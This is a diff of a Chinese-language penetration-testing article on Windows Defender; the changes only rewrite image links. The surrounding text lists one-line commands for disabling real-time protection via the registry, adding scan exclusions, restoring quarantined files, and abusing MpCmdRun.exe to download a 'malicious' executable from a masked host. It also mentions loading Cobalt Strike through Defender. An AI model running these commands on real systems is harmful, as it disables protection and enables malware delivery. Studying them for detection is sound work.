@@ -36,7 +36,7 @@ defender相关的知识。
 引擎版本：1.1.19500.2 防病毒定义：1.373.1325.0 反间谍软件定义：1.373.1325.0 网络检查系统引擎版本：2.1.14600
 4 网络检查系统定义版本：119.0.00 测试权限：administrator
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090353.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090353.png)
 
 ## 查看Windows defender版本
 
@@ -44,7 +44,7 @@ defender相关的知识。
 
 设置-更新和安全-Windows Defender
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090355.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090355.png)
 
 ### 命令行查看
 
@@ -54,21 +54,21 @@ defender相关的知识。
     
     dir "C:\ProgramData\Microsoft\Windows Defender\Platform\" /od /ad /b
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090356.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090356.png)
 
 ## 查看已存在的查杀排除列表
 
   * • 通过面板查看依次选择`设置-更新和安全-Windows Defender-添加排除项`如下图
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090357.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090357.png)
 
   * • 通过命令行查看`reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s`
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090358.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090358.png)
 
   * • 通过Powershell查看`Get-MpPreference | select ExclusionPath`
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090359.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090359.png)
 
 ## 关闭Windows Defender的实时保护
 
@@ -78,7 +78,7 @@ defender相关的知识。
     
     设置-更新和安全-Windows Defender-实时保护
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090400.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090400.png)
 
 ### 通过命令行关闭defender 实时保护
 
@@ -86,7 +86,7 @@ defender相关的知识。
 
   * • 需要关闭Tamper Protection`reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD /f`
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090401.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090401.png)
 
 注：通过命令行开启defender 实时保护
 
@@ -115,7 +115,7 @@ defender相关的知识。
     
     reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "c:\tide" /d 0 /t REG_DWORD /f
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090403.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090403.png)
 
 ## 恢复被隔离的文件
 
@@ -137,13 +137,13 @@ antivirus?view=o365-worldwide
 
   * • 查看被隔离的文件列表`MpCmdRun -Restore -ListAll`
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090404.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090404.png)
 
   * • 恢复指定名称的文件至原目录`MpCmdRun -Restore -FilePath C:\tide\7.exe`
 
   * • 恢复所有文件至原目录`MpCmdRun -Restore -All`
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090405.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090405.png)
 
   * • 查看指定路径是否位于排除列表中`MpCmdRun -CheckExclusion -path C:\test`
 
@@ -153,7 +153,7 @@ antivirus?view=o365-worldwide
 
 AdvancedRun是运行于Windows系统的轻量级程序设置优先级软件，可以轻松设置程序运行优选级，并且还能够支持通过命令行调用设置，也支持将参数保存为配置文件，以便于更好进行使用。在图形化界面
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090406.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090406.png)
 
 或者使用命令行
 
@@ -176,7 +176,7 @@ Defender自带的MpCmdRun.exe程序下载恶意文件
     
     MpCmdRun.exe -DownloadFile -url http://*.*.*.*:81/co.exe -path c:\co.exe
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090407.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090407.png)
 
 ### MpCmdRun.exe解密和加载Cobalt Strike攻击载荷
 
@@ -186,14 +186,14 @@ ransomware-abuses-windows-defender-to-load-cobalt-strike/
 加载修改后的MPClient.dll执行c0000015.log进而实现上线Cobalt
 Strike，当然这就触及到我的知识盲区了，感兴趣的铁子可以继续研究一下（教教我）。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090410.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090410.png)
 
 ## 参考文章
 
 https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows-
 Defender
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090411.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230223090411.png)
 
 E
 
